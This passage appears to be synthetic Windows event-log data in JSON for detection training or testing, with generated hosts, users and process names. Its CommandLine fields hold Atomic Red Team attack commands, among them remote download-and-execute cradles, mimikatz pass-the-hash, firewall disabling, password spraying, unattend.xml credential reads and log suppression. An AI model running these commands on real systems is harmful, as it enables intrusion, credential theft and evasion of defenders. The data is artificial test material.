        "LogonGuid": "17c8e5bb-a161-4266-ba23-7a40956366da",
        "SourceProcessID": 7236,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\level..dll",
        "DestinationProcessID": 1433,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\big..dll",
        "UtcTime": "2024-05-17T01:36:51.709288Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-42.petersen.biz",
        "User": "johnsonkaylee",
        "ProcessID": 9550,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"#{regsvr32path}\\\\#{regsvr32name} /s /u /i:#{url} scrobj.dll\\n\",",
        "LogonID": 276570,
        "LogonGuid": "c04c9e13-1a11-415d-bd1c-6c746962a9a4",
        "SourceProcessID": 1071,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\bring..exe",
        "DestinationProcessID": 1169,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\event..dll",
        "UtcTime": "2024-05-17T01:36:51.709288Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-21.murphy.biz",
        "User": "starkteresa",
        "ProcessID": 9546,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\\n. \\\"#{test_harness}\\\"\\n\\n$InstallerAssemblyDir = \\\"#{assembly_dir}\\\"\\n$InstallerAssemblyFileName = \\\"#{assembly_filename}\\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\\"/logfile= /logtoconsole=false /U `\\\"$InstallerAssemblyFullPath`\\\"\\\"\\n$ExpectedOutput = 'Constructor_Uninstall_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\\"\\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\\"@\\n}\\n\",",
        "LogonID": 894163,
        "LogonGuid": "bc26ade5-2137-47a4-ade0-fa2ecac2d7f0",
        "SourceProcessID": 9809,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\art..dll",
        "DestinationProcessID": 5523,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\wish..exe",
        "UtcTime": "2024-05-17T01:36:51.710288Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-05.davis.com",
        "User": "elizabeth21",
        "ProcessID": 7196,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"halt --reboot\\n\",",
        "LogonID": 386542,
        "LogonGuid": "508895d0-ece1-40d8-a9ed-5ecfd9b005f3",
        "SourceProcessID": 5802,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\word..exe",
        "DestinationProcessID": 8300,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\provide..dll",
        "UtcTime": "2024-05-17T01:36:51.710288Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-54.scott.com",
        "User": "james99",
        "ProcessID": 8183,
        "ProcessName": "malware.exe",
        "CommandLine": "\"uname -srm\\n\",",
        "LogonID": 109630,
        "LogonGuid": "be7730d1-2428-4936-be47-a0488bf908eb",
        "SourceProcessID": 4892,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\third..dll",
        "DestinationProcessID": 1052,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\anything..dll",
        "UtcTime": "2024-05-17T01:36:51.710288Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-20.gordon-duncan.com",
        "User": "anthony26",
        "ProcessID": 5515,
        "ProcessName": "malware.exe",
        "CommandLine": "\"reg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\SharedAccess\\\\Parameters\\\\FirewallPolicy\\\\PublicProfile\\\" /v \\\"EnableFirewall\\\" /t REG_DWORD /d 0 /f\\n\",",
        "LogonID": 407239,
        "LogonGuid": "53be9363-e9b2-49c5-a27f-0fd9620b5fb0",
        "SourceProcessID": 1559,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\themselves..exe",
        "DestinationProcessID": 9112,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\list..exe",
        "UtcTime": "2024-05-17T01:36:51.710288Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-41.sanchez.info",
        "User": "jasonmartinez",
        "ProcessID": 1351,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"@FOR /F %n in (%temp%\\\\users.txt) do @echo | set/p=. & @net use %logonserver%\\\\IPC$ /user:\\\"%userdomain%\\\\%n\\\" \\\"#{password}\\\" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\\\\IPC$ > NUL\\n\",",
        "LogonID": 198647,
        "LogonGuid": "310e65b8-e91c-4f41-a83f-ce5952648942",
        "SourceProcessID": 7283,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\last..dll",
        "DestinationProcessID": 3637,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\world..dll",
        "UtcTime": "2024-05-17T01:36:51.710288Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-86.best.biz",
        "User": "vanessa56",
        "ProcessID": 7662,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"scp #{local_file} #{username}@#{remote_host}:#{remote_path}\\n\",",
        "LogonID": 381743,
        "LogonGuid": "f659205c-577b-4420-aa1e-d5a619bf710f",
        "SourceProcessID": 1527,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\former..exe",
        "DestinationProcessID": 4893,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\maybe..exe",
        "UtcTime": "2024-05-17T01:36:51.711287Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-65.melton-tyler.info",
        "User": "thompsonrobert",
        "ProcessID": 2071,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"openssl genrsa -out #{key_filename} 4096\\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \\\"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\\\" -out #{cert_filename}\\ncp #{cert_filename} /usr/local/share/certs/\\ncertctl rehash\\n\",",
        "LogonID": 206828,
        "LogonGuid": "51566f31-df9a-4ada-a711-75b90ad7dc41",
        "SourceProcessID": 3810,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\long..dll",
        "DestinationProcessID": 6457,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\fly..exe",
        "UtcTime": "2024-05-17T01:36:51.711287Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-25.delgado-weaver.com",
        "User": "marco35",
        "ProcessID": 4409,
        "ProcessName": "nc.exe",
        "CommandLine": "\"sysmon -u\\n\",",
        "LogonID": 650272,
        "LogonGuid": "999655c5-b2fa-4b5d-8e26-cd63f6987f21",
        "SourceProcessID": 3330,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\find..exe",
        "DestinationProcessID": 9520,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\beat..dll",
        "UtcTime": "2024-05-17T01:36:51.711287Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-18.macias-watson.net",
        "User": "christopherbecker",
        "ProcessID": 8931,
        "ProcessName": "malware.exe",
        "CommandLine": "\"for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \\\"#{query_type}\\\" \\\"#{subdomain}-$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\\\" -QuickTimeout}\\n\",",
        "LogonID": 259379,
        "LogonGuid": "a323ef5c-1dd8-42e2-a44a-0583d5452b5b",
        "SourceProcessID": 8033,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\new..exe",
        "DestinationProcessID": 9817,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\fine..exe",
        "UtcTime": "2024-05-17T01:36:51.711287Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-65.leon.com",
        "User": "gwilson",
        "ProcessID": 2672,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"sftp #{username}@#{remote_host}:#{remote_file} #{local_path}\\n\",",
        "LogonID": 131437,
        "LogonGuid": "dd8961c2-8bde-4b71-be0b-c42c75338760",
        "SourceProcessID": 2023,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\material..exe",
        "DestinationProcessID": 1963,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\down..exe",
        "UtcTime": "2024-05-17T01:36:51.711287Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-58.lloyd.com",
        "User": "suzanne30",
        "ProcessID": 6780,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"Get-AdGroup -Filter *\\n\",",
        "LogonID": 177164,
        "LogonGuid": "fca9812d-97b1-463d-9f34-d89e90edad82",
        "SourceProcessID": 2627,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\Republican..dll",
        "DestinationProcessID": 1477,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\though..exe",
        "UtcTime": "2024-05-17T01:36:51.712287Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-13.douglas.net",
        "User": "sanchezkristen",
        "ProcessID": 7483,
        "ProcessName": "nc.exe",
        "CommandLine": "\"type C:\\\\Windows\\\\Panther\\\\unattend.xml\\ntype C:\\\\Windows\\\\Panther\\\\Unattend\\\\unattend.xml\\n\",",
        "LogonID": 392478,
        "LogonGuid": "3c6399e8-0d68-402a-830f-b77a5346171d",
        "SourceProcessID": 9294,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\role..exe",
        "DestinationProcessID": 1611,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\court..dll",
        "UtcTime": "2024-05-17T01:36:51.712287Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-08.arnold.com",
        "User": "bescobar",
        "ProcessID": 3083,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"powershell.exe -exec bypass -noprofile \\\"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\\\"\\n\",",
        "LogonID": 862964,
        "LogonGuid": "8b91d3e8-000f-46ab-88a4-3154414724ab",
        "SourceProcessID": 2229,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\trial..exe",
        "DestinationProcessID": 8938,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\between..dll",
        "UtcTime": "2024-05-17T01:36:51.712287Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-98.thompson.info",
        "User": "christywang",
        "ProcessID": 2595,
        "ProcessName": "nc.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose\\n\",",
        "LogonID": 901926,
        "LogonGuid": "5a2a6a01-5f78-4598-bc77-c9ed4cfbd35e",
        "SourceProcessID": 2613,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\agree..dll",
        "DestinationProcessID": 9224,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\apply..dll",
        "UtcTime": "2024-05-17T01:36:51.712287Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-11.holden.info",
        "User": "sjarvis",
        "ProcessID": 9789,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"DYLD_INSERT_LIBRARIES=#{dylib_file} #{file_to_inject}\\n\",",
        "LogonID": 936379,
        "LogonGuid": "a3b8e5de-0540-4f5f-95f3-48394f53c4cd",
        "SourceProcessID": 2474,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\wonder..dll",
        "DestinationProcessID": 5338,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\ground..exe",
        "UtcTime": "2024-05-17T01:36:51.713288Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-17.walker-rice.com",
        "User": "gibsonerin",
        "ProcessID": 4184,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"#{mimikatz_path} \\\"sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}\\\"\\n\",",
        "LogonID": 171244,
        "LogonGuid": "cc4e1457-6a66-458f-a373-389f5ca84fbe",
        "SourceProcessID": 9264,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\property..dll",
        "DestinationProcessID": 4555,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\hair..dll",
        "UtcTime": "2024-05-17T01:36:51.713288Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-89.morales.info",
        "User": "rodriguezryan",
        "ProcessID": 1020,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"Get-Service WinDefend #check the service state of Windows Defender\\nGet-MpComputerStatus #provides the current status of security solution elements, including Anti-Spyware, Antivirus, LoavProtection, Real-time protection, etc\\nGet-MpThreat #threats details that have been detected using MS Defender\\n\",",
        "LogonID": 290514,
        "LogonGuid": "2200d685-e74f-4840-a201-beff55b39b62",
        "SourceProcessID": 1390,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\protect..exe",
        "DestinationProcessID": 3881,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\describe..exe",
        "UtcTime": "2024-05-17T01:36:51.713288Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-56.ramirez.info",
        "User": "vpeterson",
        "ProcessID": 7556,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"set +o history\\n\",",
        "LogonID": 186804,
        "LogonGuid": "a075459b-4c15-46c9-9056-ee14159859c4",
        "SourceProcessID": 5365,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\election..exe",
        "DestinationProcessID": 5993,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\must..dll",
        "UtcTime": "2024-05-17T01:36:51.713288Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-71.mcpherson.biz",
        "User": "collinsmaureen",
        "ProcessID": 5656,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\WinStations\\\\RDP-Tcp\\\" /v PortNumber /t REG_DWORD /d #{NEW_Remote_Port} /f\\nnetsh advfirewall firewall add rule name=\\\"RDPPORTLatest-TCP-In\\\" dir=in action=allow protocol=TCP localport=#{NEW_Remote_Port}\\n\",",
        "LogonID": 738852,
        "LogonGuid": "976e63f7-faba-4145-b86e-4822a789a84a",
        "SourceProcessID": 6778,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\yes..exe",
        "DestinationProcessID": 4147,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\trip..dll",
        "UtcTime": "2024-05-17T01:36:51.713288Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-74.rivas.com",
        "User": "wesleyburch",
        "ProcessID": 8674,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Cd \\\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\"\\nNew-ItemProperty -Path Registry::HKEY_CURRENT_USER\\\\SOFTWARE\\\\Microsoft\\\\Office\\\\16.0\\\\Excel\\\\Security -Name \\\"VBAWarnings\\\" -Value \\\"1\\\" -PropertyType DWORD -Force | Out-Null\\n& '.\\\\Excel 2016.lnk' \\\"PathToAtomicsFolder\\\\T1204.002\\\\bin\\\\mirrorblast_emulation.xlsm\\\"\",",
        "LogonID": 604514,
        "LogonGuid": "28474210-dd3a-4f83-8177-02fc1bcaebf6",
        "SourceProcessID": 3571,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\all..exe",
        "DestinationProcessID": 1309,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\different..dll",
        "UtcTime": "2024-05-17T01:36:51.714287Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-82.hill.com",
        "User": "fernando99",
        "ProcessID": 5400,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"C:\\\\Windows\\\\System32\\\\inetsrv\\\\appcmd.exe set config \\\"#{website_name}\\\" /section:httplogging /dontLog:true\\n\",",
        "LogonID": 581739,
        "LogonGuid": "1c2db78f-b506-458b-b11c-ef1b9410cebd",
        "SourceProcessID": 1002,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\back..dll",
        "DestinationProcessID": 7665,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\school..dll",
        "UtcTime": "2024-05-17T01:36:51.714287Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-77.brown.com",
        "User": "deborahburton",
        "ProcessID": 5526,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"reg add \\\"hklm\\\\system\\\\currentcontrolset\\\\control\\\\print\\\\monitors\\\\AtomicRedTeam\\\" /v \\\"Driver\\\" /d \\\"#{monitor_dll}\\\" /t REG_SZ /f\\n\",",
        "LogonID": 201277,
        "LogonGuid": "c603ac1e-b5e2-4170-8775-86a00f08cdbe",
        "SourceProcessID": 2132,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\speech..exe",
        "DestinationProcessID": 8996,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\compare..dll",
        "UtcTime": "2024-05-17T01:36:51.714287Z"
    },
